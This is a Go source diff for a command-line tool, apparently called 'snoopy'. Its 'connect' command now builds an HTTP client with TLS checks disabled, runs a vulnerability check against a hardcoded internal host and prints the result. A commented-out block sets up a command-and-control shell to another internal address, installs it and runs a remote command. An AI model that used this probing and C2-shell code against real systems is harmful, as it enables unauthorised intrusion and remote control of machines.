@@ -1,8 +1,11 @@
 package cmd
 
 import (
+	"crypto/tls"
+	"fmt"
 	"github.com/spf13/cobra"
-	"snoopy/terminal"
+	"net/http"
+	"snoopy/exploit"
 )
 
 var connectCmd = &cobra.Command{
@@ -18,5 +21,40 @@ func init() {
 }
 
 func connect(cmd *cobra.Command, args []string) error {
-	return terminal.Run(args[0])
+	client := &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{
+				InsecureSkipVerify: true,
+			},
+		},
+	}
+
+	version, err := exploit.CheckIfVulnerable("10.0.0.10", 443, true, client)
+	if err != nil {
+		return err
+	}
+
+	fmt.Println(version)
+
+	return nil
+
+	//shell, _ := c2.New(
+	//	"192.168.1.247",
+	//	c2.WithEncoder(&encoders.Simple{}),
+	//)
+	//
+	//_ = shell.Install()
+	//
+	//script := "dir /w"
+	//result, err := shell.DoScript(&script)
+	//if err != nil {
+	//	return err
+	//}
+	//
+	//fmt.Println(result)
+	//
+	//shell.Shutdown()
+	//
+	//return nil
+	//return terminal.Run("http", args[0], 10000)
 }
